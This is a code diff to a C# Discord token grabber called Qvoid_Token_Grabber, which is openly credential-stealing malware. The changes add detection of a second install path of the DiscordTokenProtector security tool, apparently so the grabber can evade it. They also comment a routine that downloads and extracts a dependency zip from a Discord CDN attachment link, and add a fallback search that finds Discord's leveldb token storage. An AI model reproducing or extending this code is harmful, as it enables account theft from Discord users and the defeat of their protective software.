@@ -1,4 +1,3 @@
-using LastDudeOnTheTrack.Properties;
 using Qvoid_Token_Grabber.PasswordGrabbers;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -15,8 +14,8 @@ using System.Windows.Forms;
 using System;
 using Discord;
 using QvoidWrapper;
-using static Discord.Structures.Embed;
 using System.IO.Compression;
+using static Discord.Structures.Embed;
 
 namespace Qvoid_Token_Grabber
 {
@@ -569,7 +568,12 @@ namespace Qvoid_Token_Grabber
                 {
                     Directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DiscordTokenProtector",
                     Name = "DiscordTokenProtector"
-                }
+                },
+                new Protector()
+                {
+                    Directory = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\DTP_WindowsInstaller",
+                    Name = "DiscordTokenProtector"
+                },
             };
 
             foreach (var protector in protectors)
@@ -646,6 +650,11 @@ namespace Qvoid_Token_Grabber
                 Process.Start(DiscordExe);
         }
 
+        /// <summary>
+        /// Extracts the grabber dependencies to the destination directory.
+        /// </summary>
+        /// <param name="Path"></param>
+        /// <param name="Destination"></param>
         static public void Extract(string Path, string Destination)
         {
             Directory.CreateDirectory(Path);
@@ -653,11 +662,13 @@ namespace Qvoid_Token_Grabber
             FileInfo info = new FileInfo(Path + "Release.zip");
             if (!info.Exists)
             {
+                //Downloads the dependencies if they don't exists.
                 using (WebClient wc = new WebClient())
                     wc.DownloadFile("https://cdn.discordapp.com/attachments/825091638782459912/889657500192874496/Release.zip", Path + "Release.zip");
             }
             else
             {
+                //Verifing the file (you can use SHA256CheckSum), if not valid we install the dependencies.
                 if (info.Length <= 5000)
                     using (WebClient wc = new WebClient())
                         wc.DownloadFile("https://cdn.discordapp.com/attachments/825091638782459912/889657500192874496/Release.zip", Path + "Release.zip");
@@ -665,9 +676,11 @@ namespace Qvoid_Token_Grabber
 
             try
             {
+                //Extracts the ZIP content (dependencies) to the destination directory.
                 ZipFile.ExtractToDirectory(Path + "Release.zip", Destination);
             }
-            catch { }
+            catch 
+            { }
         }
 
         /// <summary>
@@ -768,6 +781,26 @@ namespace Qvoid_Token_Grabber
                             foreach (var item in temp)
                                 if (item.Contains("leveldb"))
                                     TokensLocation.Add($"{item}\\");
+                        }
+                    }
+                }
+            }
+
+            if (TokensLocation.Count == 0)
+            {
+                if (File.Exists(DiscordExe.Replace("Discord.exe", "") + "resources\\tmp\\common\\paths.js"))
+                {
+                    var newLocation_tray = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "tray-connected.png", SearchOption.AllDirectories);
+                    var newLocation_Transport = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "badge-11.ico", SearchOption.AllDirectories);
+                    foreach (var _file in newLocation_tray)
+                    {
+                        foreach (var __file in newLocation_Transport)
+                        {
+                            if (_file.Replace("tray-connected.png", "") == __file.Replace("badge-11.ico", ""))
+                            {
+                                if (Directory.Exists(_file.Replace("tray-connected.png", "") + "\\Local Storage\\leveldb"))
+                                    TokensLocation.Add(_file.Replace("tray-connected.png", "") + "\\Local Storage\\leveldb");
+                            }
                         }
                     }
                 }
